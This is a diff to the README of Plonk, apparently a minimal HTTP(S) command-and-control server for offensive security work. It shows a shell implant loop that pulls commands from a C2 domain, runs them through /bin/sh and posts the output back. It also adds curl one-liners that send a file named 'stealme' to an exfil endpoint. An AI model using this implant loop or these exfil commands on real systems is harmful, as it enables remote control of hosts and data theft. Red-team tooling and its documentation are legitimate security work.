@@ -18,16 +18,22 @@ plonk -letsencrypt c2domain.example.com
 ```bash
 while :; do
         curl -s https://c2domain.example.com/t/kittens |
-        /bin/sh |
+        /bin/sh 2>&1 |
         curl --data-binary @- -s https://c2domain.example.com/o/kittens
         
         sleep 15
 done
 ```
 3. Tasking and output
-```bash
-plonk -interact kittens
-ps awwwfux
+```
+$ plonk -interact kittens
+2023/05/23 22:20:14 Welcome.  Going interactive with kittens.
+uname -a
+2023/05/23 22:21:10 [TASKQ] Added task (queue length 1):
+uname -a
+2023/05/23 22:21:34 [CALLBACK] Sent task "uname -a"
+2023/05/23 22:21:35 [OUTPUT]
+OpenBSD c2.example.com 7.2 GENERIC#728 amd64
 ```
 
 Features
@@ -40,6 +46,7 @@ Features
 - Static file server
 - Tasking over HTTP(s)
 - Task output logging over HTTP(s)
+- Exfil sent over HTTP(s) saved to files
 - Simple interactive interface
 
 Installation
@@ -56,6 +63,23 @@ The [Makefile](./Makefile) will build Plonk for the current architecture or
 `$GOOS`/`$GOARCH`, as appropriate.  It is provided to accommodate muscle
 memory.
 
+Tasking and Output
+------------------
+Tasking is queued in a JSON object in `plonk.d/tasking`, usually either by
+somthing like `plonk -task kittens "id && uname -a"` for one-off taskig or
+`plonk -interact kittens` for interactive operations.  Implants retrieve
+tasking with HTTP requets to `/t/<ImplantID>`, one tasking per query.
+
+Output is sent back in HTTP requests to `/o/<ImplantID>` and will be logged
+in `plonk.d/log`.  Output will be parsed out of the log and printed nicely
+when using `plonk -interact`.
+
+The ImplantID `-` is used for implants which don't actually send an
+`<ImplantID>`.  The ImplantID `-next-` can be used to wait for and then task or
+interact with the implant with the next logged callback.  If `-verbose` isn't
+used, sending SIGHUP to the server process will cause previously-logged
+ImplantIDs to be logged again.
+
 Static And Default Files
 ------------------------
 Static files placed in `plonk.d/files` will be served under the path `/f`, e.g.
@@ -64,6 +88,25 @@ a request for `https://example.com/f/tools/implant` will return
 
 Requests for unexpected paths (i.e. not in the table below) will be served
 a static file, `plonk.d/index.html`.
+
+Exfil
+-----
+The bodies of HTTP requets to `/p` will be saved to files in `plonk.d/exfil`.
+This is useful for situations in which output is too big or cumbersome to be
+saved to the log or printed interactively (i.e. with `/o`).  The HTTP body
+will be saved as-is.  If a multipart form is sent, the multipart form headers
+will alse be saved.  This can be handy for also saving a filename.
+
+The following cURL oneliners can be used to send back exfil to Plonk:
+```sh
+curl --data-binary @./stealme https://example.com/p/kittens # ./stealme will be saved to plonk.d/exfil
+curl -Fa=@./stealme https://example.com/p/kittens           # Saves multipart form headers too
+```
+
+By default, at most 100MB is saved per request.  This can be changed with the
+`PLONK_EXFILMAX` environment variable.
+
+Saving exfil can be disabled with `-no-exfil`.
 
 Implants
 --------
@@ -75,6 +118,7 @@ Default Endpoint | [Environment Variable](#Environment-Variables) | Description
 `/f/<path>`      | `PLONK_FILESPREFIX`/`PLONK_STATICFILESDIR`     | Download a static file
 `/t/<ImplantID>` | `PLONK_TASKPREFIX`                             | Retrieve tasking
 `/o/<ImplantID>` | `PLONK_OUTPUTPREFIX`                           | Return output
+`/p/<ImplantID>` | `PLONX_EXFILPREFIX`/`PLONK_EXFILDIR`           | Save exfil to files
 
 The `/<ImplantID>` above may be omitted for an IDless implant.  To interact
 with an IDless implant, `-task -` and `-interact -` may be used.  If more than
@@ -91,7 +135,7 @@ Signals, SIGHUP and SIGUSR1.
 
 SIGHUP causes the following:
 - Tasking file is closed and reopened.  This is useful for after editing it
-  with vim.
+  by hand.
 - Certificates cached in memory are forgotten.  This is useful for manual
   certificate updating with no downtime.
 - Seen implants are forgotten.  This is useful for logging the next callback
@@ -196,21 +240,24 @@ Environment Variables
 ---------------------
 Plonk reads configuration from the following environment variables at runtime:
 
-Variable               | Default       | Description
------------------------|---------------|------------
-`PLONK_DEFAULTFILE`    |`index.html`   | File served for otherwise-unhandled requests
-`PLONK_FILESPREFIX`    |`f`            | URL path prefix for requesting static files
-`PLONK_HTTPTIMEOUT`    |`1m`           | HTTP request timeout
-`PLONK_LECERTDIR`      |`lecerts`      | Let's Encrypt certificate cache directory
-`PLONK_LOCALCERTDIR`   |`certs`        | Locally-configured (non-Let's Encrypt) certificate directory
-`PLONK_LOGFILE`        |`log`          | Logfile
-`PLONK_OUTPUTMAX`      |`10485760`     | Maximum output read in one request from an Implant
-`PLONK_OUTPUTPREFIX`   |`o`            | URL path prefix used by implants to request to send output
-`PLONK_STATICFILESDIR` |`files`        | Static files directory
-`PLONK_TASKFILE`       |`tasking.json` | Queued tasking file
-`PLONK_TASKPREFIX`     |`t`            | URL path prefix used by implants to request tasking
+Variable               | Default        | Description
+-----------------------|----------------|------------
+`PLONK_DEFAULTFILE`    | `index.html`   | File served for otherwise-unhandled requests
+`PLONK_EXFILDIR`       | `exfil`        | Directory to which to save exfil
+`PLONK_EXFILMAX`       | `10485760`     | Maximum exfil saved to a file
+`PLONK_EXFILPREFIX`    | `p`            | URL path prefix for saving exfil
+`PLONK_FILESPREFIX`    | `f`            | URL path prefix for requesting static files
+`PLONK_HTTPTIMEOUT`    | `1m`           | HTTP request timeout
+`PLONK_LECERTDIR`      | `lecerts`      | Let's Encrypt certificate cache directory
+`PLONK_LOCALCERTDIR`   | `certs`        | Locally-configured (non-Let's Encrypt) certificate directory
+`PLONK_LOGFILE`        | `log`          | Logfile
+`PLONK_OUTPUTMAX`      | `10485760`     | Maximum output read in one request from an Implant
+`PLONK_OUTPUTPREFIX`   | `o`            | URL path prefix used by implants to request to send output
+`PLONK_STATICFILESDIR` | `files`        | Static files directory
+`PLONK_TASKFILE`       | `tasking.json` | Queued tasking file
+`PLONK_TASKPREFIX`     | `t`            | URL path prefix used by implants to request tasking
 
 The list may also be printed with `-print-env`.
 
 Filenames and directories above are taken as subdirectories of Plonk's working
-directory, by default `plonk.d` unless they're absolute paths.
+directory, by default `plonk.d`, unless they're absolute paths.
